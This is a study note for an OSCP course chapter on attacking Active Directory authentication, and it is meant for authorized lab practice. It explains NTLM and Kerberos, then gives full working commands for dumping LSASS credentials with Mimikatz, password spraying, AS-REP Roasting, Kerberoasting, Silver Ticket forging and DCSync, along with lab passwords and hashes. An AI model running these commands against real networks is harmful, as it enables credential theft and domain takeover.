---
title: "PEN-200 Chapter 22 - Attacking Active Directory Authentication"
aliases:
  - "Attacking Active Directory Authentication"
  - "PEN-200 Ch 22"
tags:
  - oscp
  - pen-200
  - active-directory
  - kerberos
  - ntlm
  - mimikatz
  - asrep-roasting
  - kerberoasting
  - silver-ticket
  - dcsync
source: "PEN-200 Chapter 22 - Attacking Active Directory Authentication"
status: "study-note"
---

# PEN-200 Chapter 22 — Attacking Active Directory Authentication

> [!summary]
> This chapter moves from **AD enumeration** into **credential and authentication abuse**. It explains NTLM and Kerberos, where Windows caches credentials/tickets, and then uses that knowledge for password spraying, AS-REP Roasting, Kerberoasting, Silver Tickets, and DCSync.

> [!important]
> These notes follow the uploaded PEN-200 chapter. Commands and example lab values are preserved because they are directly useful for OSCP-style practice. Use them only in authorized environments.

## Chapter map

- [[#22.1 Understanding Active Directory Authentication]]
  - [[#22.1.1 NTLM Authentication]]
  - [[#22.1.2 Kerberos Authentication]]
  - [[#22.1.3 Cached AD Credentials]]
- [[#22.2 Performing Attacks on Active Directory Authentication]]
  - [[#22.2.1 Password Attacks]]
  - [[#22.2.2 AS-REP Roasting]]
  - [[#22.2.3 Kerberoasting]]
  - [[#22.2.4 Silver Tickets]]
  - [[#22.2.5 Domain Controller Synchronization]]
- [[#22.3 Wrapping Up]]
- [[#Attack chain connection]]
- [[#Mini OSCP cheat sheet]]

---

# 22.1 Understanding Active Directory Authentication

The chapter first establishes the authentication mechanisms that later attacks abuse. The focus is **NTLM**, **Kerberos**, and **cached AD credentials/tickets** on Windows.

A key idea for the whole chapter is that successful AD attacks often come from understanding **what secret protects a particular authentication object**:

- NTLM authentication depends on the user's **NTLM password hash**.
- Kerberos TGTs are protected by the **krbtgt** account secret.
- Kerberos service tickets are protected by the **service account/SPN password hash**.
- Cached hashes and Kerberos tickets can reside in **LSASS** memory.

---

## 22.1.1 NTLM Authentication

### What NTLM is used for

The chapter explains that NTLM may be used when:

- A client authenticates to a server by **IP address rather than hostname**.
- A hostname is not registered correctly in AD-integrated DNS.
- A third-party application explicitly chooses NTLM rather than Kerberos.

Kerberos is the normal/default AD authentication mechanism, but NTLM remains common as a fallback and in older or third-party scenarios.

### NTLM authentication flow

The NTLM process is challenge/response based:

1. The client derives an **NTLM hash** from the user's password.
2. The client sends the username to the server.
3. The server returns a random **nonce/challenge**.
4. The client encrypts/transforms the challenge using the NTLM hash and sends the resulting **response**.
5. The server forwards the username, challenge, and response to the domain controller.
6. The domain controller uses the stored NTLM hash for that user to independently calculate the expected response.
7. If the calculated value matches the client's response, authentication succeeds.

### Why NTLM hashes matter offensively

The hash itself is not mathematically “reversed,” but NTLM is fast to test, so weak passwords can be recovered through offline guessing/cracking. This is why NTLM hashes obtained later through LSASS dumping or DCSync are valuable.

> [!oscp]
> Think of an NTLM hash as both a **crackable password verifier** and, in other attack contexts, a reusable authentication secret. This chapter mainly emphasizes obtaining and cracking it; the next lateral-movement chapter builds further on reuse.

---

## 22.1.2 Kerberos Authentication

Kerberos is Microsoft's primary AD authentication mechanism. Unlike NTLM challenge/response, Kerberos uses a **ticket system** involving a **Key Distribution Center (KDC)** running on each domain controller.

### Important Kerberos objects

- **KDC** — service on the domain controller that issues tickets and session keys.
- **AS-REQ** — Authentication Server Request sent by the client during initial authentication.
- **AS-REP** — Authentication Server Reply containing a session key and TGT when authentication succeeds.
- **TGT** — Ticket Granting Ticket; proves the client has authenticated and is later used to request service tickets.
- **TGS-REQ** — Ticket Granting Service Request used to ask the KDC for access to a specific service.
- **TGS-REP** — response containing a service ticket and session key for that service.
- **AP-REQ** — request sent from client to the target application/service containing the service ticket and authenticator data.
- **SPN** — Service Principal Name identifying a service instance in AD.

### Initial authentication: AS-REQ → AS-REP

When a user logs in:

1. The client sends an **AS-REQ** to the KDC/domain controller.
2. The AS-REQ includes the username and a timestamp encrypted using a key derived from the user's password.
3. The domain controller looks up the user's password hash in `ntds.dit` and tries to decrypt/validate the timestamp.
4. If successful and the timestamp is acceptable, authentication is valid.
5. The DC sends an **AS-REP**.

The AS-REP contains:

- A session key encrypted using the user's password-derived key.
- A **TGT**.

The TGT contains identity/session information and is encrypted using the secret associated with the **krbtgt** account, so the client cannot simply alter it.

The chapter notes a default TGT lifetime of about **10 hours**, with renewal possible without re-entering the password.

### Requesting access to a service: TGS-REQ → TGS-REP

When the user wants to access a domain resource:

1. The client sends a **TGS-REQ** to the KDC.
2. The request includes the TGT, target service/resource name, and authenticator information protected with the session key.
3. The KDC decrypts and validates the TGT.
4. It checks the ticket timestamp, username consistency, and client IP information described in the chapter.
5. If valid, the KDC returns a **TGS-REP**.

The TGS-REP includes:

- The service name.
- A client-to-service session key.
- A **service ticket** containing user identity and group membership information.

Crucially, the **service ticket is encrypted with the password hash/key of the service account associated with the SPN**. This design detail is what makes **Kerberoasting** and **Silver Ticket** attacks possible.

### Service authentication: AP-REQ

The client sends an **AP-REQ** to the application server containing the service ticket and authenticator information.

The server:

1. Decrypts the service ticket using the service account's password-derived key.
2. Extracts the user identity and session key.
3. Validates the AP-REQ.
4. Uses group membership information from the ticket to assign permissions.

> [!important]
> Kerberos attack logic becomes much easier when you remember **which secret encrypts which ticket**:
>
> - **TGT** → protected by `krbtgt`.
> - **Service ticket/TGS** → protected by the target service account/SPN secret.

---

## 22.1.3 Cached AD Credentials

Windows Kerberos single sign-on requires reusable credential material to remain available. Modern Windows stores important authentication material in the memory of **LSASS (Local Security Authority Subsystem Service)**.

### Why LSASS matters

LSASS can contain or give access to:

- NTLM hashes.
- SHA-1-related credential material depending on Windows/AD version.
- Kerberos TGTs.
- Kerberos service tickets.
- In older/explicitly configured cases, WDigest cleartext passwords.

LSASS runs with very high privileges, so obtaining secrets from it normally requires **SYSTEM or local administrator** access. This creates a common attack progression:

`Initial foothold → Local privilege escalation → LSASS credential extraction → Domain credential reuse/attack`

### Tool: Mimikatz

The chapter uses **Mimikatz** as the primary credential/ticket extraction tool.

> [!warning]
> The chapter notes that standalone Mimikatz is well known to security products. It mentions alternatives such as executing it in memory or dumping LSASS with a built-in utility (for example Task Manager) and analyzing the dump elsewhere. Those evasion details are referenced rather than developed in this chapter.

### RDP into the domain workstation

```bash
xfreerdp /cert-ignore /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.50.75
```

**Tool:** `xfreerdp` — RDP client.

**Arguments:**

- `/cert-ignore` — ignore certificate validation warnings.
- `/u:jeff` — username.
- `/d:corp.com` — domain.
- `/p:HenchmanPutridBonbon11` — password.
- `/v:192.168.50.75` — target RDP host.

**When/why:** Use when you already have valid Windows credentials and need an interactive session on a domain workstation.

### Start Mimikatz and enable debug privilege

```powershell
cd C:\Tools
.\mimikatz.exe
```

Inside Mimikatz:

```text
privilege::debug
```

**`privilege::debug`** enables `SeDebugPrivilege`, allowing Mimikatz to interact with processes owned by other accounts, including privileged processes such as LSASS when run elevated.

### Dump logged-on credentials from LSASS

```text
sekurlsa::logonpasswords
```

**Module:** `sekurlsa`.

**Purpose:** Enumerates authentication material for logged-on sessions and can expose NTLM hashes and other cached secrets.

The chapter example obtains hashes for users such as `jeff` and `dave`.

### Kerberos tickets cached in LSASS

The chapter first causes an SMB service ticket to be requested by listing a remote share:

```powershell
dir \\web04.corp.com\backup
```

This access causes a Kerberos service ticket for the SMB/CIFS service to be cached.

Then Mimikatz lists tickets:

```text
sekurlsa::tickets
```

**Purpose:** Display cached Kerberos tickets in LSASS.

The output contains both:

- **TGS/service tickets** — usable only for the associated service/resource.
- **TGTs** — more flexible because a TGT can be used to request new service tickets for resources.

The chapter notes that Mimikatz can also **export tickets to disk** and **import tickets into LSASS**, which becomes useful for ticket-reuse attacks.

### AD CS / certificate private-key note

The chapter briefly connects cached authentication material with **Active Directory Certificate Services (AD CS)**. Certificates may have private keys marked **non-exportable**, but Mimikatz can patch relevant cryptographic components to make them exportable.

Mimikatz commands/modules mentioned:

```text
crypto::capi
crypto::cng
```

- `crypto::capi` — patches CryptoAPI behavior so non-exportable private keys can be exported.
- `crypto::cng` — targets the KeyIso/CNG path for the same general purpose.

**When/why:** Relevant when AD authentication uses certificates and you have sufficient local privilege on a machine holding a valuable certificate/private key.

---

# 22.2 Performing Attacks on Active Directory Authentication

This learning unit converts the protocol details above into practical attack paths. The techniques are not strictly sequential; they can appear at different points of an AD penetration test depending on what access and permissions you already have.

The chapter covers:

1. Password attacks / password spraying.
2. AS-REP Roasting.
3. Kerberoasting.
4. Silver Tickets.
5. Domain Controller Synchronization (DCSync).

---

## 22.2.1 Password Attacks

The major operational concern is **account lockout**. Before spraying passwords, determine the domain's password/lockout policy.

### Check password and lockout policy

```powershell
net accounts
```

**Tool:** built-in Windows `net` command.

**Why:** Shows password age/length settings plus lockout threshold, duration, and observation window.

The chapter example shows:

- Lockout threshold: `5`
- Lockout duration: `30` minutes
- Lockout observation window: `30` minutes

This means four bad attempts remain below the threshold, but the chapter warns that real users may also generate failures, so a tester must leave a safety margin.

> [!oscp]
> Before any spray, write down:
>
> - lockout threshold
> - observation/reset window
> - lockout duration
> - whether your spraying tool automatically respects policy

### Method 1 — LDAP/ADSI with `DirectoryEntry`

The chapter demonstrates using .NET's `System.DirectoryServices.DirectoryEntry` with explicit credentials. If the supplied username/password is valid, the object is successfully created and queried; invalid credentials cause an exception.

```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")
```

**What each line does:**

- `GetCurrentDomain()` — gets the current AD domain object.
- `.PdcRoleOwner.Name` — obtains the PDC/DC hostname.
- `LDAP://` — builds an LDAP connection URI.
- `Replace('.', ',DC=')` — converts a DNS domain such as `corp.com` into a DN component.
- `New-Object ... DirectoryEntry(...)` — attempts an LDAP bind using the supplied username and password.

**When/why:** A low-and-slow password check from a domain-joined Windows host; useful when you want direct LDAP/ADSI authentication testing.

### Method 1 automated — `Spray-Passwords.ps1`

The chapter uses the existing script `C:\Tools\Spray-Passwords.ps1`.

```powershell
cd C:\Tools
powershell -ep bypass
.\Spray-Passwords.ps1 -Pass Nexus123! -Admin
```

**Arguments:**

- `powershell -ep bypass` — starts PowerShell with Execution Policy set to Bypass for this process.
- `-Pass Nexus123!` — spray one password against discovered users.
- `-File <wordlist>` — alternative mentioned in the chapter for supplying passwords from a file.
- `-Admin` — also target administrator accounts.

**When/why:** Automates LDAP/ADSI-based password spraying and identifies domain users automatically.

### Method 2 — SMB spraying with CrackMapExec

Prepare usernames:

```bash
cat users.txt
```

Example file contents:

```text
dave
jen
pete
```

Spray one password:

```bash
crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
```

**Arguments:**

- `smb` — use SMB authentication.
- `192.168.50.75` — any suitable domain-joined SMB target in the example.
- `-u users.txt` — username file (or a single username).
- `-p 'Nexus123!'` — password to test.
- `-d corp.com` — AD domain.
- `--continue-on-success` — do not stop after finding the first valid credential.

**When/why:** Fast operational way to validate domain credentials and simultaneously discover whether credentials give administrative access to a target.

**Caveat:** The chapter emphasizes that CrackMapExec does **not** first examine the domain lockout policy. SMB spraying is also noisier because each attempt requires an SMB connection.

Check a known credential and local-admin status:

```bash
crackmapexec smb 192.168.50.75 -u dave -p 'Flowers1' -d corp.com
```

The chapter's output contains:

```text
(Pwn3d!)
```

`Pwn3d!` indicates that the valid credentials have administrative privileges on that target.

### Method 3 — Kerberos TGT-based spraying with Kerbrute

The chapter explains that obtaining a TGT can validate credentials with very little traffic: an AS-REQ is sent and the response indicates success/failure.

It mentions `kinit` as a standard Linux tool that can obtain/cache a TGT when valid credentials are supplied, then uses **Kerbrute** to automate spraying.

Create a username file:

```powershell
type .\usernames.txt
```

Example contents:

```text
pete
dave
jen
```

Run Kerbrute:

```powershell
.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
```

**Arguments:**

- `passwordspray` — Kerbrute mode for testing one password across many users.
- `-d corp.com` — target domain.
- `.\usernames.txt` — usernames to test.
- `"Nexus123!"` — password to spray.

**When/why:** Kerberos-based password spraying with less SMB noise; useful from Windows or Linux because Kerbrute is cross-platform.

> [!tip]
> The chapter notes that if Kerbrute produces a network error with the username file, ensure the file is encoded as **ANSI**.

### Password attack decision points

- **LDAP/ADSI** — controlled and scriptable from domain Windows context.
- **SMB/CrackMapExec** — convenient and gives admin-status feedback, but is noisy and does not protect you from lockout by itself.
- **Kerberos/Kerbrute** — efficient authentication checking through AS-REQ behavior.

---

## 22.2.2 AS-REP Roasting

### Core idea

Normal Kerberos preauthentication requires the client to prove knowledge of the user's password-derived key before the KDC returns an AS-REP.

If the AD account option **“Do not require Kerberos preauthentication”** is enabled, an attacker can request an AS-REP for that user without first proving knowledge of the password. Part of the AS-REP is encrypted using material derived from the user's password, so it can be taken offline and cracked.

This is **AS-REP Roasting**.

### Linux — find/request AS-REP hashes with `impacket-GetNPUsers`

```bash
impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast corp.com/pete
```

The command prompts for `pete`'s password in the chapter example.

**Arguments:**

- `-dc-ip 192.168.50.70` — domain controller IP.
- `-request` — request AS-REP/TGT material for vulnerable accounts rather than only enumerate them.
- `-outputfile hashes.asreproast` — save roastable hashes in Hashcat-compatible format.
- `corp.com/pete` — credentials/context used to query the domain.

**When/why:** Enumerate accounts with preauthentication disabled and obtain crackable AS-REP hashes from Kali/Linux.

The example identifies `dave` as vulnerable.

### Identify the Hashcat mode

```bash
hashcat --help | grep -i "Kerberos"
```

The chapter selects:

```text
18200 | Kerberos 5, etype 23, AS-REP
```

### Crack the AS-REP hash

```bash
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

**Arguments:**

- `-m 18200` — Hashcat mode for Kerberos 5 AS-REP, etype 23.
- `hashes.asreproast` — captured AS-REP hash file.
- `/usr/share/wordlists/rockyou.txt` — wordlist.
- `-r /usr/share/hashcat/rules/best64.rule` — mutation/rule file.
- `--force` — force execution; the chapter uses this because cracking is performed in a VM.

The lab example cracks `dave` to:

```text
Flowers1
```

### Windows — Rubeus AS-REP Roasting

```powershell
cd C:\Tools
.\Rubeus.exe asreproast /nowrap
```

**Arguments:**

- `asreproast` — search for vulnerable users and request AS-REP hashes.
- `/nowrap` — prevent line wrapping/newlines in the returned hash so it is easier to copy into a cracking file.

**When/why:** Perform AS-REP Roasting from a Windows domain context. In the chapter, Rubeus automatically searches AD for accounts configured without preauthentication.

The resulting hash is copied into `hashes.asreproast2`, then cracked with the same Hashcat mode:

```bash
sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

### Enumerating vulnerable accounts without roasting immediately

Windows / PowerView command mentioned:

```powershell
Get-DomainUser -PreauthNotRequired
```

**Purpose:** Enumerate users whose account configuration does not require Kerberos preauthentication.

Linux alternative mentioned:

```bash
impacket-GetNPUsers ...
```

Use it **without** `-request` and `-outputfile` when you only want to identify vulnerable accounts rather than immediately request hashes.

### Targeted AS-REP Roasting

If you have **GenericWrite** or **GenericAll** permissions over another AD user, the chapter explains that you may modify that user's User Account Control settings to disable Kerberos preauthentication, request the AS-REP hash, and then restore the original setting.

This is **Targeted AS-REP Roasting**.

> [!important]
> The chapter does not provide the exact modification command here; it provides the attack concept and explicitly says the account setting should be reset after obtaining the hash.

---

## 22.2.3 Kerberoasting

### Core idea

Any authenticated domain user can request a service ticket for a known SPN. The KDC does not first check whether that user will ultimately be authorized to use the service.

Because the service ticket is encrypted using the **service account/SPN password-derived key**, the attacker can obtain the ticket and perform offline password guessing against it.

This is **Kerberoasting**.

### Windows — Rubeus Kerberoasting

```powershell
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```

**Arguments:**

- `kerberoast` — enumerate user-linked SPNs and request service tickets suitable for roasting.
- `/outfile:hashes.kerberoast` — save returned TGS-REP hashes.

**When/why:** Use from an authenticated Windows domain session to find SPNs associated with user accounts and obtain crackable service-ticket hashes.

The chapter finds:

```text
SamAccountName       : iis_service
ServicePrincipalName : HTTP/web04.corp.com:80
```

### Inspect the captured hash

```bash
cat hashes.kerberoast
```

### Determine Hashcat mode

```bash
hashcat --help | grep -i "Kerberos"
```

For the chapter's TGS-REP etype 23 hash, use:

```text
13100 | Kerberos 5, etype 23, TGS-REP
```

### Crack the TGS-REP hash

```bash
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

**Arguments:**

- `-m 13100` — Hashcat Kerberos 5 TGS-REP etype 23 mode.
- `hashes.kerberoast` — captured service-ticket hash.
- `rockyou.txt` — password candidates.
- `-r best64.rule` — mutate candidates.
- `--force` — force run in the VM environment used by the chapter.

The example cracks `iis_service` to:

```text
Strawberry1
```

### Linux — `impacket-GetUserSPNs`

```bash
sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
```

**Arguments:**

- `-request` — request TGS/service-ticket material for discovered SPNs.
- `-dc-ip 192.168.50.70` — domain controller IP.
- `corp.com/pete` — authenticated domain user used to query/request tickets; password is prompted for.

**When/why:** Kerberoast from Kali/Linux without joining the host to the domain.

Store the returned TGS-REP hash in a file, then crack it:

```bash
sudo hashcat -m 13100 hashes.kerberoast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

### Clock skew troubleshooting

If `impacket-GetUserSPNs` returns:

```text
KRB_AP_ERR_SKEW(Clock skew too great)
```

The chapter says to synchronize Kali's time with the domain controller using tools such as:

```bash
ntpdate
```

or:

```bash
rdate
```

**Why:** Kerberos is time-sensitive; excessive clock skew breaks ticket authentication.

### Which SPNs are realistic targets?

The chapter emphasizes that Kerberoasting works best against SPNs running under **ordinary user accounts with weak human-chosen passwords**.

Cracking is generally impractical against:

- computer accounts,
- managed service accounts,
- group-managed service accounts,
- `krbtgt`,

because their passwords are long/randomly generated in the scenarios described.

### Targeted Kerberoasting

If you have **GenericWrite** or **GenericAll** over a user account, the chapter explains that you can add an SPN to that account, request/roast a service ticket, and then remove the SPN after obtaining the hash.

> [!important]
> The chapter presents this concept but does not provide the exact SPN-modification command in this section.

---

## 22.2.4 Silver Tickets

### Core idea

A **Silver Ticket** is a forged Kerberos **service ticket** for a specific service/SPN.

The attack works because the service normally trusts a service ticket that correctly decrypts with its own account secret. In many environments, the service does not ask the domain controller to revalidate the full Privileged Account Certificate (PAC).

With the service account password or NTLM hash, you can create a service ticket containing attacker-chosen identity/group information.

### Information required

The chapter lists three key values:

1. **SPN password hash** (the NTLM hash of the service account in the example).
2. **Domain SID**.
3. **Target SPN**.

Example target:

```text
HTTP/web04.corp.com:80
```

### Confirm current user does not have access

```powershell
iwr -UseDefaultCredentials http://web04
```

**Tool:** `iwr` is the PowerShell alias for `Invoke-WebRequest`.

**Argument:**

- `-UseDefaultCredentials` — authenticate using the currently logged-on Windows user's credentials.

The initial request returns HTTP `401 Unauthorized`, proving `jeff` lacks access.

### Obtain the service-account NTLM hash from LSASS

Run elevated Mimikatz:

```text
privilege::debug
sekurlsa::logonpasswords
```

In the chapter example, the relevant service-account hash is:

```text
iis_service NTLM: 4d28cf5252d39971419580a51484ca09
```

### Obtain the domain SID

```powershell
whoami /user
```

The example returns a user SID:

```text
S-1-5-21-1987370270-658905905-1781884369-1105
```

Remove the final RID (`-1105`) to obtain the domain SID:

```text
S-1-5-21-1987370270-658905905-1781884369
```

### Forge and inject the service ticket with Mimikatz

```text
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
```

Despite the module name `kerberos::golden`, the chapter uses it to create this **Silver Ticket** by specifying a service and service key.

**Arguments:**

- `/sid:<SID>` — domain SID.
- `/domain:corp.com` — AD domain.
- `/ptt` — **Pass The Ticket**; inject the forged ticket into the current logon session.
- `/target:web04.corp.com` — host on which the target SPN runs.
- `/service:http` — service type/protocol from the SPN.
- `/rc4:<NTLM hash>` — NTLM/RC4 key of the service account.
- `/user:jeffadmin` — existing domain username to place in the forged ticket in this example.

**When/why:** Use when you possess the secret for a service account/SPN and want to forge access to that service without needing the impersonated user's password/hash.

### Confirm the forged ticket is loaded

```powershell
klist
```

**Purpose:** Lists cached Kerberos tickets for the current session.

The chapter verifies a ticket for:

```text
http/web04.corp.com
```

### Use the Silver Ticket

```powershell
iwr -UseDefaultCredentials http://web04
```

This time the request returns HTTP `200 OK`, showing the forged service ticket is accepted.

> [!note]
> The chapter's listing caption refers to “accessing the SMB share,” but the actual command and example are HTTP/IIS access to `web04`.

### PAC validation and limitations

PAC validation is an optional service-to-DC check. If the service performs PAC validation, forged-ticket abuse becomes harder because the domain controller validates the user's claims.

The chapter also notes a Microsoft security update that extends PAC validation and mitigates forging tickets for nonexistent users in the same domain. Therefore, use a **real domain username** for modern environments as the chapter example does.

### Why Silver Tickets matter in the attack chain

This attack generally appears **later** in an engagement because obtaining a service-account password hash often already requires local admin/SYSTEM access, Kerberoasting success, or another high-value credential compromise.

It is excellent for moving from **credential material → authenticated service access** while avoiding normal KDC issuance of the forged service ticket.

---

## 22.2.5 Domain Controller Synchronization

### Core idea

AD domains commonly have multiple domain controllers that synchronize directory objects using the **Directory Replication Service (DRS) Remote Protocol**.

A DC receiving a replication request checks whether the requesting security principal has the necessary replication permissions; it does not simply require the caller to literally be another known DC.

Therefore, a sufficiently privileged user can impersonate a DC and request password data through replication. This is **DCSync**.

### Required rights

The chapter lists these directory replication rights:

- **Replicating Directory Changes**
- **Replicating Directory Changes All**
- **Replicating Directory Changes in Filtered Set**

By default, members of these groups have the necessary rights:

- Domain Admins
- Enterprise Admins
- Administrators

A user explicitly delegated the replication rights can also perform the attack.

### Windows — Mimikatz DCSync

Start Mimikatz:

```powershell
cd C:\Tools\
.\mimikatz.exe
```

Request credentials for `dave`:

```text
lsadump::dcsync /user:corp\dave
```

**Module/argument:**

- `lsadump::dcsync` — perform a DRS replication-style credential request.
- `/user:corp\dave` — specify the domain account whose secrets should be retrieved.

**When/why:** Once you control a user with directory replication rights, obtain NTLM hashes/Kerberos keys for arbitrary domain users directly from a domain controller without dumping LSASS on the DC.

The example returns `dave`'s NTLM hash:

```text
08d7a47a6f9f66b97b1bae4178747494
```

> [!note]
> The chapter's Listing 821 caption says it obtains the credentials of `pete`, but the actual command and output target `dave`.

### Crack a DCSync-obtained NTLM hash

Store the hash in `hashes.dcsync`, then run:

```bash
hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

**Arguments:**

- `-m 1000` — Hashcat mode for NTLM.
- `hashes.dcsync` — file containing the NTLM hash.
- `rockyou.txt` — wordlist.
- `-r best64.rule` — candidate mutation rules.
- `--force` — force execution in the chapter's VM setup.

The chapter cracks the example to:

```text
Flowers1
```

### DCSync a domain administrator

```text
lsadump::dcsync /user:corp\Administrator
```

This demonstrates that DCSync can retrieve the hash of **any domain account** when the attacker has replication rights.

### Linux — `impacket-secretsdump`

```bash
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
```

**Arguments/format:**

- `-just-dc-user dave` — request secrets only for the specified domain user.
- `corp.com/jeffadmin:<password>@192.168.50.70` — authenticate with a replication-capable account and target the domain controller by IP.
- The password's `!` is escaped in the shell in the chapter command.

**When/why:** Perform DCSync from Kali/non-domain-joined Linux using Impacket.

The output includes:

- NTLM hash.
- Kerberos keys (AES/DES variants in the example).

The tool reports that it uses the **DRSUAPI** method to retrieve `NTDS.DIT` secrets.

### Why DCSync is so powerful

Once you have replication rights, you can request secrets for:

- ordinary users,
- service accounts,
- privileged administrators,
- other high-value domain principals.

This creates credential material that can be cracked or reused for later lateral movement.

---

# 22.3 Wrapping Up

The chapter's central lesson is that you cannot reliably attack AD authentication without understanding the mechanics underneath it.

The practical progression is:

- Understand how **NTLM** validates challenge/response.
- Understand how **Kerberos** issues TGTs and service tickets.
- Understand where Windows keeps **hashes and tickets** in LSASS.
- Check for weak credentials with **password spraying**.
- Abuse accounts without preauthentication using **AS-REP Roasting**.
- Abuse service-account SPNs using **Kerberoasting**.
- Use a compromised service secret to forge a **Silver Ticket**.
- Use privileged replication rights to perform **DCSync** and retrieve domain credentials.

The next PEN-200 module builds on these credentials and tickets for **lateral movement in Active Directory**.

---

# Tool and command reference

| Tool / command | Main purpose in this chapter | Key arguments / notes |
|---|---|---|
| `xfreerdp` | Interactive RDP access | `/u`, `/d`, `/p`, `/v`, `/cert-ignore` |
| `net accounts` | Read password/lockout policy | Check threshold and observation window before spraying |
| `DirectoryEntry` | LDAP/ADSI credential validation | LDAP path, username, password |
| `Spray-Passwords.ps1` | Automated password spraying | `-Pass`, `-File`, `-Admin` |
| `crackmapexec smb` | SMB spraying and admin check | `-u`, `-p`, `-d`, `--continue-on-success` |
| `kinit` | Obtain/cache a TGT | Mentioned as a Kerberos credential-validation primitive |
| `kerbrute` | Kerberos username/password spraying | `passwordspray`, `-d` |
| `Mimikatz privilege::debug` | Enable debug privilege | Needed for privileged LSASS interaction |
| `Mimikatz sekurlsa::logonpasswords` | Dump cached logon material | Requires high local privileges |
| `Mimikatz sekurlsa::tickets` | List cached Kerberos tickets | Shows TGTs/TGSs in LSASS |
| `Mimikatz crypto::capi` | Patch CryptoAPI | Make certain non-exportable cert keys exportable |
| `Mimikatz crypto::cng` | Patch CNG/KeyIso path | Same general certificate-key goal |
| `impacket-GetNPUsers` | AS-REP Roasting | `-dc-ip`, `-request`, `-outputfile` |
| `Rubeus asreproast` | AS-REP Roasting on Windows | `/nowrap` |
| `Get-DomainUser -PreauthNotRequired` | Find AS-REP-roastable users | PowerView function |
| `Rubeus kerberoast` | Kerberoasting on Windows | `/outfile:` |
| `impacket-GetUserSPNs` | Kerberoasting on Linux | `-request`, `-dc-ip` |
| `hashcat` | Offline cracking | `-m 18200` AS-REP, `-m 13100` TGS-REP, `-m 1000` NTLM |
| `ntpdate` / `rdate` | Fix Kerberos clock skew | Synchronize tester time with DC |
| `iwr` | Test HTTP service authentication | `-UseDefaultCredentials` |
| `whoami /user` | Get current user's SID | Remove RID to derive domain SID |
| `Mimikatz kerberos::golden` | Forge Silver Ticket in this chapter | `/sid`, `/domain`, `/target`, `/service`, `/rc4`, `/user`, `/ptt` |
| `klist` | View current Kerberos cache | Verify forged/imported ticket is present |
| `Mimikatz lsadump::dcsync` | DCSync from Windows | `/user:<domain\\user>` |
| `impacket-secretsdump` | DCSync from Linux | `-just-dc-user` plus privileged credentials and DC IP |

---

# Attack chain connection

`Recon → Enumeration → Initial Access → Privilege Escalation → Credentials → Pivoting → AD → Proof`

## Recon

Chapter 22 is not primarily a reconnaissance chapter, but earlier discovery feeds directly into it. You need to know things such as:

- domain name,
- domain controller IP/hostname,
- reachable SMB/Kerberos/LDAP services,
- candidate Windows workstations/servers.

## Enumeration

This chapter assumes the previous AD enumeration work has already produced:

- usernames,
- group memberships,
- SPNs/service accounts,
- possibly ACL relationships such as `GenericWrite`/`GenericAll`.

Enumeration directly determines which authentication attacks are possible:

- Users with no preauthentication → **AS-REP Roasting**.
- User-linked SPNs → **Kerberoasting**.
- Writable user objects → **targeted AS-REP Roasting** or **targeted Kerberoasting**.
- Replication rights / Domain Admin membership → **DCSync**.

## Initial Access

Authentication attacks can create or expand initial access:

- Password spraying may give the first valid domain credential.
- AS-REP Roasting may recover a password without knowing it beforehand.
- Kerberoasting may reveal a service-account password.

A single valid domain credential is often enough to start meaningful AD enumeration and resource access.

## Privilege Escalation

Privilege escalation and this chapter are tightly connected:

- To extract LSASS material with Mimikatz, you generally need **local administrator/SYSTEM**.
- A local admin foothold can expose credentials of other users/services logged on to that machine.
- Higher AD privileges can unlock DCSync.

So a typical path is:

`Low privilege shell → local admin → LSASS → better domain credential`

## Credentials

This is the chapter's strongest connection to the chain. It teaches multiple ways to obtain credential material:

- sprayed passwords,
- AS-REP hashes,
- TGS-REP hashes,
- cached NTLM hashes,
- cached Kerberos tickets,
- service-account keys/hashes,
- arbitrary domain hashes via DCSync.

Then it uses Hashcat to convert offline-verifier material into cleartext passwords when possible.

## Pivoting

This chapter does not focus on network tunneling, but its outputs create the identities used to pivot logically through the domain:

- Use newly cracked credentials on other hosts.
- Use tickets to access specific services.
- Use privileged accounts to reach machines or services previously inaccessible.

The following chapter explicitly develops lateral movement from these credentials.

## AD

This is where the chapter sits most directly:

- Kerberos/NTLM understanding gives context.
- AS-REP Roasting and Kerberoasting target AD authentication design/configuration.
- Silver Tickets forge AD service authentication.
- DCSync abuses AD replication privileges to extract domain credential data.

A strong result from this chapter can move you from **one domain user** to **service account**, **local admin**, or even **domain-wide credential access**.

## Proof

For OSCP-style work, convert compromise into verifiable proof while recording what credential/path made it possible.

Examples of proof/validation from this chapter:

- CrackMapExec shows a valid credential and possibly `(Pwn3d!)` for admin rights.
- `iwr -UseDefaultCredentials` changes from `401` to `200` after a Silver Ticket.
- `klist` shows the forged/cached ticket.
- DCSync output contains the requested user's NTLM hash.
- Cracked hashes produce a usable cleartext password that can be validated on an authorized target.

Keep notes on:

- source account,
- target service/host,
- attack used,
- obtained hash/ticket/password,
- privilege level,
- next reachable target.

---

# OSCP workflow reminders

> [!check]
> **Before password attacks**
> 1. Get domain/DC information.
> 2. Enumerate users.
> 3. Run `net accounts` if you have a Windows domain session.
